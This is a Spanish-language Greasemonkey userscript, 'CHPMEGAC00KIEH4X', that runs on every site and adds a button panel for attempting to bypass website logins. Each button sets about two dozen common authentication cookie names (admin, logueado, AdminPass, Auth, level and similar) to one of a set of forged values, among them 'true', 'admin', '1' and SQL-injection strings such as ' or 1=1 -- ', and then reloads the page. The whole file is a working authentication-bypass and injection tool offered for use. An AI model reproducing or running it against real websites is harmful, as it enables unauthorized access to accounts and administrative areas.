// ==UserScript==
// @name           CHPMEGAC00KIEH4X
// @namespace      http://xd-blog.com.ar/
// @description    Trata de saltearse logins manipulando las cookies
// @include        *
// ==/UserScript==
// V 1.1

// ====
// Autor: seth (xd dot seth at gmail dot com, http://xd-blog.com.ar/)
// Contribuciones: The X-C3LL (http://0verl0ad.blogspot.com/)

// Queres ayudar? Entrá a http://osvdb.org/search?search[vuln_title]=Cookie+Manipulation&search[text_type]=titles y buscá los nombres y valores de las cookies

// Changelog:
// 1.1 Anda de nuevo
// 1.0 Primer version

//Metemos el div con los botones
var str = '';
for (var i=0; i<13; i++){
  str = str + '<input value="[' + i + ']" onclick="mandale_mecha(' + i +');" type="button" style="width:100%; height:20px" /><br />';
};
var div = document.createElement("div");
div.innerHTML = '<div style="height: 60px; width:100px; position:fixed; top:5px; right:5px; background-color: black; color: #AAAAAA;">' + str + '</div>';

document.body.appendChild(div);

//La funcion que crea las cookies
function mandale_mecha(valor){
  nombres = ['admin', 'logueado', 'loged', 'user', 'usuario', 'userId', 'loggedon', 'adm', 'login_admin', 'AdminPass', 'Auth', 'Name', 'level', 'logged', 'admin_log',
'adminLoggedIn', 'myadminname', 'awse_logged', 'authuser', 'group_id', 'lvl', 'membercookie', 'memberid'];
  valores = ['true', 'yes', 'si', '1', 'admin', 'administrador', 'administrator', 'OK', 'right', 'logged', 'in', ' or 1=1', '\' or 1=1 -- '];

  var exdate = new Date();
  exdate.setDate(exdate.getDate() + 1);

  for (i=0; i<nombres.length; i++){
    var c_value = escape(valores[valor]) + "; expires="+exdate.toUTCString();
    document.cookie = nombres[i] + "=" + c_value;
  }

  location.reload();
}

// http://stackoverflow.com/questions/5006460/userscripts-greasemonkey-calling-a-websites-javascript-functions/5006576#5006576
function addFunction(func, exec) {
  var script = document.createElement("script");
  script.textContent = (exec ? "(" : "") + func.toString() + (exec ? ")();" : "");
  document.body.appendChild(script);
}

//Metemos la funcion en la pagina para que pueda ser llamada por onclick
addFunction(mandale_mecha, false);


